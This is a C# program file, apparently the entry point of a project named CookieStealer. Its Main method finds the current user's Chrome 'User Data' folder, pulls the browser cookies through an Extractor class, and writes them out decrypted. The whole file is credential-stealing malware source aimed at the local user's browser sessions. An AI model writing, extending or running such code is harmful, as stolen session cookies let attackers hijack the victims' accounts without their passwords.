using CookieStealer.Cookies;

namespace CookieStealer;

internal static class Program
{
    private static void Main()
    {
        Console.Clear();

        var username = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        var path = @$"{username}\AppData\Local\Google\Chrome\User Data";
        
        var extractor = new Extractor();
        var cookies = Extractor.GetCookies(path);
        Extractor.ExtractCookies(@"Cookies_Decrypted");
        
        Thread.Sleep(5 * 1000);

    }
}